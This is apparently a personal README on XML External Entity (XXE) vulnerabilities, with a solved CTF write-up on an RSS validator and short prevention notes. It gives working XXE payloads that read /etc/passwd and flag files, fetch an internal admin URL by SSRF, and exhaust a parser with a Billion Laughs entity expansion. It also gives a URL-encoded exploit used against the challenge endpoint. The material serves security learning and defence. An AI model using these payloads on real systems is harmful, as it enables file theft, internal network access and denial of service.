# XXE (XML External Entity) Vulnerabilities

A comprehensive reference documenting how XXE vulnerabilities work, how to test for them, and a real-world CTF case that I personally solved. This README serves as a future reminder for exploitation techniques, payload crafting, debugging steps, and best practices.



## 🦆 What is XXE?

XML External Entity (XXE) vulnerabilities occur when an XML parser processes external entities inside a `DOCTYPE` declaration. If external entities are enabled, attackers can:

* Read local files
* Perform SSRF (server-side request forgery)
* Trigger blind exfiltration (OOB XXE)
* Cause Denial of Service (Billion Laughs attack)

The vulnerability happens when a server accepts XML input and the parser is misconfigured.



## 🧩 How an XXE Payload Works

A malicious XXE payload injects a custom entity using `DOCTYPE`. Example:

    <?xml version="1.0"?>
    <!DOCTYPE data [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>

When parsed, `&xxe;` expands to the content of `/etc/passwd`.
Or for a ctf flag. Always check the response to know which html tag the xml is accepting in it's response. eg for below is <title> tag

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
    ]>
    <title>&xxe;</title>


## ✔️ Key Types of XXE Attacks

### **1. File Read (Classic XXE)**

Reads files from the server.

### **2. SSRF via XXE**

The parser fetches a remote DTD from attacker’s server.

    <?xml version="1.0"?>
    <!DOCTYPE root [
      <!ENTITY e SYSTEM "http://10.0.0.5/admin">
    ]>
    <root>&e;</root>

### **3. Blind XXE (OOB)**

Leak data using external DNS/HTTP callbacks.

### **4. DoS (Billion Laughs)**

Overloads XML parser with recursive entities.

    <?xml version="1.0"?>
    <!DOCTYPE lolz [
      <!ENTITY a "aaaaaaaaaa">
      <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
      <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
      <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    ]>
    <root>&d;</root>


## 🧪 How to Test for XXE

### Step 1 — Submit minimal XXE payload

Check if external entities are processed:

```xml
<!DOCTYPE data [<!ENTITY test "Hello">]><root>&test;</root>
```

If output contains `Hello`, the parser is vulnerable.

### Step 2 — Attempt local file read

```xml
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

### Step 3 — Adjust payload to match the app's expected XML structure

Many apps only parse specific XML tags.



## 🏆 Real CTF Case Solved (Important Reference)

This section documents an XXE challenge I solved, including why the first payload failed and how the final working exploit was crafted.

### **Challenge Summary**

Target endpoint:

```
POST /rss.php
```

The application claimed to validate RSS feeds and only displayed:

* `<title>`
* `<description>`
  Hence, any injected data **must appear inside those tags**.

### **Failed Attempt**

Initially, I injected the XXE under custom tags:

```xml
<data>
  <user>&xxe;</user>
</data>
```

The app ignored them since it only reads `<title>` and `<description>`.

### **Working Exploit (Flag Extracted)**

This payload successfully printed the content of `file:///flag.txt` inside the `<title>` tag:

<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+data+[++<!ENTITY+xxe+SYSTEM+"file%3a///flag.txt">]>++++<title>%26xxe%3b</title>
```

Decoded readable XML:

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
    ]>
    <title>&xxe;</title>
```

The flag appeared in the validated RSS output.

### **Why This Worked**

* The parser parsed `DOCTYPE`
* External entities were allowed
* The app printed `<title>` contents
* So placing `&xxe;` inside `<title>` forced the server to display the file content



## 🛠️ Common File Paths in CTFs

Try these standard flag paths:

```
/flag
/flag.txt
/root/flag
/root/flag.txt
/var/www/flag
/var/www/html/flag
```



## 🔐 Preventing XXE (Defensive Notes)

For future secure development:

* Disable external entity loading in XML parsers
* Disable DTD processing
* Use safe libraries (`defusedxml`, secure PHP configs, etc.)



## 📚 Final Notes

This README acts as a personal reference for XXE exploitation. It includes:

* Theory
* Payloads
* Troubleshooting steps
* A full practical example from a solved CTF

Perfect for remembering how to approach similar bugs in future assessments or competitions.



## 📜 License

This repository is intended for educational, ethical hacking, and CTF learning purposes only.

